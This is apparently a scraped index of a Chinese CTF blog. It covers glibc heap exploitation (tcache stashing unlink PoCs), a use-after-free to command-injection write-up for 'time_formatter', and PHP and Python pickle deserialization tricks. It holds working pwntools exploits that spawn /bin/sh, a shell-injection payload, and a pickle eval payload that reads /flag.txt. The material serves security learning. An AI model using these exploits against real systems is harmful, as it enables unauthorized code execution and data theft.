payload)show()r.recvuntil(b&#x27;\\n2: price.100, des.&#x27;, drop=True)real_atoi_addr = u32(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(4, b&#x27;\\0&#x27;))print(real_atoi_addr)offset = real_atoi_addr-libc.symbols[&#x27;atoi&#x27;]system_addr = libc.symbols[&#x27;system&#x27;]+offsetupdate(b&#x27;2&#x27;, 0x20, p32(system_addr))r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)r.sendline(b&#x27;/bin/sh&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["UAF"]},{"title":"tcache stashing unlink attack","url":"/2022/02/24/tcache-stashing-unlink-attack/","content":"tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。\n首先，这种利用方式需要的条件就是存在calloc来申请chunk。\n在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack先看一下源码：\n  if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        &#123;          bck = victim-&gt;bk;\t  if (__glibc_unlikely (bck-&gt;fd != victim))\t    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;          if (av != &amp;main_arena)\t    set_non_main_arena (victim);          check_malloced_chunk (av, victim, nb);#if USE_TCACHE\t  /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */\t  size_t tc_idx = csize2tidx (nb);\t  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\t    &#123;\t      mchunkptr tc_victim;\t      /* While bin not empty and tcache not full, copy chunks over.  */\t      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)\t\t&#123;\t\t  if (tc_victim != 0)\t\t    &#123;\t\t      bck = tc_victim-&gt;bk;\t\t      set_inuse_bit_at_offset (tc_victim, nb);\t\t      if (av != &amp;main_arena)\t\t\t\tset_non_main_arena (tc_victim);\t\t      bin-&gt;bk = bck;\t\t      bck-&gt;fd = bin;\t\t      tcache_put (tc_victim, tc_idx);\t            &#125;\t\t&#125;\t    &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;\n\n在源码的注释也写上了，当tcache没有满，其他bin没有空的情况下就会把其他bin当中的chunk put进tcache内，并且这一阶段是没有任何保护的。根据昨天的largebin attack可以很清楚的看出来，这两行代码是有问题的。\nbin-&gt;bk = bck;bck-&gt;fd = bin;\n\n接下来就用heap exploit2.31当中的poc来做演示(这个poc的方式很巧妙)。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim = 0;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\\n&quot;);\tprintf(&quot;\\n1. need to know heap address and the victim address that you need to attack\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\\n&quot;, &amp;victim, victim);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);\tprintf(&quot;\\n2. choose a stable size and free six identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;6; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);\tprintf(&quot;\\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\t\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Finally, the victim&#x27;s value is changed to a big number\\n&quot;);\tprintf(&quot;Now, victim&#x27;s value: 0x%lx\\n&quot;, victim);\treturn 0;&#125;\t\n\n首先在这里放入六个chunk到tcache内\nfor(int i=0; i&lt;6; i++)&#123;    t1 = calloc(1, 0x50);    free(t1);&#125;\n\n\n下面几步是将一个size为0x60的chunk放入smallbins当中\ns1 = malloc(0x420);pad = malloc(0x20);free(s1);malloc(0x3c0);malloc(0x100);\n\n\n下面进行相同操作把chunk放入smallbin\ns2 = malloc(0x420);pad = malloc(0x80);free(s2);malloc(0x3c0);malloc(0x100);\n\n\n接着修改后一个chunk的bk指针为target-0x10\n*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\n\n\n随后用calloc申请一个smallbin当中的chunk让另一个进入tcache\ncalloc(1, 0x50);\n\n\n可以看到目标地址的值被改变了并且我们最后一个chunk也进入的tcache\n进一步分析以上就是这个漏洞的利用方式之一，和昨天的largebin attack类似，但是这个漏洞存在一个更具有破坏性的利用方式，注意上面的两行代码当中有一行是\nbin-&gt;bk = bck;\n\n这样就导致了我们的smallbin的bk发生了改变\n\n再看在glibc当中的定义\n#define last(b)      ((b)-&gt;bk)\n\n所以这也就导致了更具有破坏性的漏洞，我们可以任意地址申请堆块，并且可以看到tcache_put也是没有任何保护\nstatic __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\ntcache stashing unlink attack+根据上面的进一步分析我们继续来heap exploit里面的poc\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim[4] = &#123;0, 0, 0, 0&#125;;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to get a tcache chunk to arbitrary address\\n&quot;);\tprintf(&quot;\\n1. need to know heap address and the victim address that you need to attack\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\t&amp;victim, victim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);    \tprintf(&quot;\\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\\n&quot;);\tvictim[1] = (uint64_t)(&amp;victim);\tprintf(&quot;\\n3. choose a stable size and free five identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;5; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;\\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\t&amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\\n&quot;);\t\tuint64_t *r = (uint64_t*)malloc(0x50);\tr[0] = 0xaa;\tr[1] = 0xbb;\tr[2] = 0xcc;\tr[3] = 0xdd;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\t\treturn 0;&#125;\t\n\n首先，这里直放入了五个chunk到tcache\nfor(int i=0; i&lt;5; i++)&#123;    t1 = calloc(1, 0x50);    free(t1);&#125;\n\n然后后面是类似的放入两个chunk到smallbin，然后改变bk指针到我们的fake chunk，最后calloc我们的s1即可实现\n需要注意的是，这里victim[1] = (uint64_t)(&amp;victim);是需要将fake_chunk的bk指针指向任意可写地址！\n\n这个时候我们的利用危害性相对来说就比较大了，但是我们可以结合起来第一个漏洞来一起使用，也就是同时修改指定地址的值，并且在另一个地方创建fake chunk\ntcache stashing unlink attack++其实利用方式也很简单，就是我们修改fake chunk的bk指针就行，这里就不细说，把poc贴出来就行了(要恰饭了)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim[4] = &#123;0, 0, 0, 0&#125;;static uint64_t victim2 = 0;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\\n&quot;);\tprintf(&quot;\\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\t&amp;victim, victim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\\n&quot;,\t\t&amp;victim2, victim2);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);\tprintf(&quot;\\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\\n&quot;);\tvictim[1] = (uint64_t)(&amp;victim2)-0x10;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;\\n3. choose a stable size and free five identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;5; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;\\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\t&amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\\n&quot;);\t\tuint64_t *r = (uint64_t*)malloc(0x50);\tr[0] = 0xaa;\tr[1] = 0xbb;\tr[2] = 0xcc;\tr[3] = 0xdd;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;victim2&#x27;s value: 0x%lx\\n&quot;,\t\tvictim2);\treturn 0;&#125;\t\n\n\n参考链接https://github.com/StarCross-Tech/heap_exploit_2.31\n","categories":["pwn"],"tags":["tcache stashing unlink attack"]},{"title":"time_formatter","url":"/2021/10/25/time-formatter/","content":"第一次做堆题目还是有点激动。\n检查保护\n没什么好说的，就开启了canary和nx。\n分析分析流程__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  __gid_t v3; // eax  int v4; // eax  v3 = getegid();  setresgid(v3, v3, v3);  setbuf(stdout, 0LL);  puts(&quot;Welcome to Mary&#x27;s Unix Time Formatter!&quot;);  do  &#123;    while ( 2 )    &#123;      puts(&quot;1) Set a time format.&quot;);      puts(&quot;2) Set a time.&quot;);      puts(&quot;3) Set a time zone.&quot;);      puts(&quot;4) Print your time.&quot;);      puts(&quot;5) Exit.&quot;);      __printf_chk(1LL, &quot;&gt; &quot;);      fflush(stdout);      switch ( choice() )      &#123;        case 1u:          v4 = choice_1();          break;        case 2u:          v4 = choice_2();          break;        case 3u:          v4 = choice_3();          break;        case 4u:          v4 = choice_4();          break;        case 5u:          v4 = choice_5();          break;        default:          continue;      &#125;      break;    &#125;  &#125;  while ( !v4 );  return 0LL;&#125;\n\n流程很简单，就是一直选这几个选项然后执行函数，main函数没什么漏洞\nint choice()// 输入一个数字选择下面的执行内容&#123;  char s[16]; // [rsp+8h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-10h]  v2 = __readfsqword(0x28u);  fgets(s, 16, stdin);  return atoi(s);&#125;\n\n__int64 choice_1()&#123;  void *v0; // rbx  v0 = get_format(&quot;Format: &quot;);  if ( check(v0) )  &#123;    ptr = v0;    puts(&quot;Format set.&quot;);  &#125;  else  &#123;    puts(&quot;Format contains invalid characters.&quot;);    sub_400C7E(v0);  &#125;  return 0LL;&#125;\n\n__int64 __fastcall get_format(const char *a1)&#123;  char s[1024]; // [rsp+8h] [rbp-410h] BYREF  unsigned __int64 v3; // [rsp+408h] [rbp-10h]  v3 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;%s&quot;, a1);  fflush(stdout);  fgets(s, 0x400, stdin);  s[strcspn(s, &quot;\\n&quot;)] = 0;  return vuln_func(s);&#125;\n\nchar *__fastcall vuln_func(const char *a1)// 漏洞函数&#123;  char *v1; // rax  char *v2; // rbx  v1 = strdup(a1);// strdup函数就是，使用malloc创建一个跟a1大小一样的chunk，然后把a1的值复制过去  if ( !v1 )    err(1, &quot;strdup&quot;);  v2 = v1;  if ( getenv(&quot;DEBUG&quot;) )    __fprintf_chk(stderr, 1LL, &quot;strdup(%p) = %p\\n&quot;, a1, v2);  return v2;&#125;\n\n_BOOL8 __fastcall check(char *s)&#123;  char accept[51]; // [rsp+5h] [rbp-43h] BYREF  unsigned __int64 v3; // [rsp+38h] [rbp-10h]  strcpy(accept, &quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;);// 检验输入的内容必须是这里面的内容  v3 = __readfsqword(0x28u);  return strspn(s, accept) == strlen(s);&#125;\n\n从这里看的话其实vuln_func没有问题，关键在chioce_4这个函数里面\n__int64 choice_4()&#123;  char command[2048]; // [rsp+8h] [rbp-810h] BYREF  unsigned __int64 v2; // [rsp+808h] [rbp-10h]  v2 = __readfsqword(0x28u);  if ( ptr )  &#123;    __snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;, dword_602120, ptr);// 然而这里给command赋值通过格式化字符串，还有ptr也在其中，所以只要修改ptr为&#x27;;/bin/sh;&#x27;就好了    __printf_chk(1LL, &quot;Your formatted time is: &quot;);    fflush(stdout);    if ( getenv(&quot;DEBUG&quot;) )      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\\n&quot;, command);    setenv(&quot;TZ&quot;, value, 1);    system(command);// 可以看到这里执行了command  &#125;  else  &#123;    puts(&quot;You haven&#x27;t specified a format!&quot;);  &#125;  return 0LL;&#125;\n\n可以看到上面的ptr被过滤了，刚好这个直接放进去是不得行的。\n__int64 choice_5()&#123;  __int64 result; // rax  char s[16]; // [rsp+8h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-10h]  v2 = __readfsqword(0x28u);  sub_400C7E(ptr);// 这个其实就是free，我也把代码贴出来了  sub_400C7E(value);  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);  fflush(stdout);  fgets(s, 16, stdin);  result = 0LL;  if ( (s[0] &amp; 0xDF) == 89 )  &#123;    puts(&quot;OK, exiting.&quot;);    result = 1LL;  &#125;  return result;&#125;\n\nvoid __fastcall sub_400C7E(void *ptr)&#123;  if ( getenv(&quot;DEBUG&quot;) )    __fprintf_chk(stderr, 1LL, &quot;free(%p)\\n&quot;, ptr);  free(ptr);&#125;\n\n可以看到，我们在选择5的时候程序是先将ptr free掉然后再询问是否退出，看到这里的第一反应就是UAF\n__int64 choice_3()&#123;  value = get_format(&quot;Time zone: &quot;);  puts(&quot;Time zone set.&quot;);  return 0LL;&#125;\n\n利用过程在执行的时候，首先选择1然后随便写入一个符合过滤要求的字符，然后写入到chunk当中，然后直接选择5，这个时候已经是free掉了ptr但是ptr没有置为null所以还是指向到被free的chunk的位置，然后是否推出选择N不退出，然后选择3，在3当中新生成的chunk其实就是ptr所指向的chunk，而且没有过滤所以直接写入payload就好，然后选择4就可以getshell\nexpfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/5781dfd4ffed4d51a72a28a8571ef063&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 57916)r = process(&#x27;./questions/5781dfd4ffed4d51a72a28a8571ef063&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Format: &#x27;)r.sendline(b&#x27;A&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;5&#x27;)r.recvuntil(b&#x27;Are you sure you want to exit (y/N)? &#x27;)r.sendline(b&#x27;N&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)payload = b&quot;&#x27;;/bin/sh;&#x27;&quot;r.recvuntil(b&#x27;Time zone: &#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["use after free"]},{"title":"反序列化漏洞的一些知识点","url":"/2021/09/17/unserialize/","content":"绕过__wakeup()函数把序列化产生的字符串里面的属性值增大比如:\tO:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\t           ^\t         表示类中含有一个属性值\tO:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\t\t\t   ^\t\t\t 修改为2即可绕过wakeup函数，可以写上__destruct()函数执行相应的响应体\n\n\n在绕过preg_match(“/[oc]:\\d/“)和__wakeup()在下面情况\n\n在序列化的过程中不同属性的对象序列化的结果不一致( &quot;=&gt;&quot; )Private属性 ： 数据类型:属性名长度:&quot;\\00类名\\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;Protected属性 ： 数据类型:属性名长度:&quot;\\00*\\00属性名&quot;;数据类型:属性值长度:&quot;属性值;;Public属性 ： 数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;\n\n在反序列化的时候，会遵循某种规则首先判断字符串的一个元素，为大写的&quot;O&quot;，跳转到验证第二字符&quot;：&quot;冒号在验证冒号是，若是为数字就会正常序列化，若是为&quot;+&quot;就会跳转到验证数字然后继续序列化所以就可以利用这种方式来绕过类似于preg_match(&quot;/[oc]:\\d/&quot;)的函数\n\n\n\n但是会产生新的问题，在以往的过程中，习惯于直接echo出序列化的结果，再进行base64加密，但是在class内部的属性为private或者protected定义的时候就会产生破坏原本的结构，破坏\\00\n\n\n\n&lt;?phpclass Demo &#123;     private $file = &#x27;fl4g.php&#x27;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#x27;index.php&#x27;) &#123;             $this-&gt;file = &#x27;index.php&#x27;;             echo &quot;yes&quot;;        &#125;     &#125; &#125;$wow=new Demo(&quot;fl4g.php&quot;);echo serialize($wow);echo &quot;&lt;br&gt;&quot;;echo base64_encode(preg_replace(&quot;/1:&#123;s/&quot;,&quot;2:&#123;s&quot;,preg_replace(&quot;/:4/&quot;,&quot;:+4&quot;,serialize($wow))));\n\n输出的结果为：\nO:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==base64解码下面的内容后：O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;得到了下面的结果，其实也因为\\00被破坏才导致看起来是一样的protected属性被序列化的时候属性值会变成 %00*%00属性名private属性被序列化的时候属性值会变成 %00类名%00属性名PS:php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可\n\n\npython反序列化(pickle)\n\n很神奇的一点就是python会把反序列化的东西放在生成在byte中(尤为注意py2,3的区别)\n题目:buuctf ikun\nimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)        else:            return self.render(&#x27;no_ass.html&#x27;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#x27;become&#x27;)            # pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。            #             #            #             # pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，            #             #            #             # pickle序列化后的数据，可读性差，人一般无法识别。            p = pickle.loads(urllib.unquote(become))            # urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式            # pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回            return self.render(&#x27;form.html&#x27;, res=p, member=1)        except:            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)\n\nimport pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))# __reduce__:当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。# __reduce__ 被定义之后，当对象被Pickle时就会被调用。# 它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。# 这个元组包含2到5个元素，其中包括：#       一个可调用的对象，用于重建对象时调用；【我们这里的eval】#       一个参数元素，供那个可调用对象使用； 【我们这里的open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()】#       被传递给 __setstate__ 的状态（可选）；#       一个产生被pickle的列表元素的迭代器（可选）；#       一个产生被pickle的字典元素的迭代器（可选）a = pickle.dumps(payload())# pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中a = urllib.quote(a)print a\n\n\nPHP对于不存在的类反序列化问题\n\n&lt;?phpecho serialize(unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;&#x27;));var_dump((unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;&#x27;));\n\nO:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;object(__PHP_Incomplete_Class)#1 (2) &#123;  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;  string(1) &quot;A&quot;  [&quot;b&quot;]=&gt;  string(3) &quot;wow&quot;&#125;可以发现产生的对象是__PHP_Incomplete_Class对象，反序列化的名字保存在__PHP_Incomplete_Class里面属性就直接放在下面\n\n现在我们自己创建一个一串反序列化的字符串\n&lt;?phpvar_dump(unserialize(&#x27;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;dzh&quot;;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;dzhsb&quot;;&#125;&#125;&#x27;));var_dump(unserialize(serialize(unserialize(&#x27;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;dzh&quot;;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;dzhsb&quot;;&#125;&#125;&#x27;))));\n\narray(2) &#123;  [0]=&gt;  object(__PHP_Incomplete_Class)#1 (2) &#123;    